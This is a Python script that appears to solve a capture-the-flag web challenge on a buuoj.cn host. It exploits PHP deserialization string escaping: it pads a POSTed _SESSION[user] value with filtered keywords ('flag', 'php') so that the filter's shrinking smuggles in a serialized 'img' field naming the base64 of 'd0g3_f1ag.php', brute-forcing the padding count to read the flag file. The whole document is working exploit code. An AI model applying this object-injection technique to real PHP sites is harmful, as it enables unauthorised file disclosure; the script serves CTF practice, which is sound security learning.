import requests
import base64
import time
import re

URL = "http://4079c9cb-e2e3-4d7b-9bc1-a686b76e15a2.node5.buuoj.cn:81/"

session = requests.Session()

# The flag file is d0g3_f1ag.php
# base64("d0g3_f1ag.php") = "ZDBnM19mMWFnLnBocA=="

target = "d0g3_f1ag.php"
target_b64 = base64.b64encode(target.encode()).decode()

print(f"Target: {target}")
print(f"Base64: {target_b64}")
print(f"Base64 length: {len(target_b64)}")

# The injection should be: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
# But wait, base64("d0g3_f1ag.php") = "ZDBnM19mMWFnLnBocA==" which is 20 chars

# Let me verify:
print(f"\nVerification: base64('d0g3_f1ag.php') = {base64.b64encode(b'd0g3_f1ag.php').decode()}")

# Construct the payload
inject = '";s:3:"img";s:20:"' + target_b64 + '";}'
print(f"\nInject: {inject}")
print(f"Inject length: {len(inject)}")

# Each 'flag' shrinks 4 bytes
# We need to find the right number of 'flag's

# Let me test different values
for n in range(5, 25):
    user_value = "flag" * n + inject
    
    data = {"_SESSION[user]": user_value}
    r = session.post(URL + "?f=show_image", data=data)
    
    if r.text and len(r.text) > 0:
        print(f"\nn={n}: '{r.text[:200]}'")
        if "flag{" in r.text.lower():
            print(f"FLAG FOUND: {r.text}")
            break
    
    time.sleep(0.3)

# Also try with 'php' keyword
print("\n=== Trying with 'php' keyword ===")
inject = '";s:3:"img";s:20:"' + target_b64 + '";}'
for n in range(5, 25):
    user_value = "php" * n + inject
    
    data = {"_SESSION[user]": user_value}
    r = session.post(URL + "?f=show_image", data=data)
    
    if r.text and len(r.text) > 0:
        print(f"\nn={n}: '{r.text[:200]}'")
        if "flag{" in r.text.lower():
            print(f"FLAG FOUND: {r.text}")
            break
    
    time.sleep(0.3)

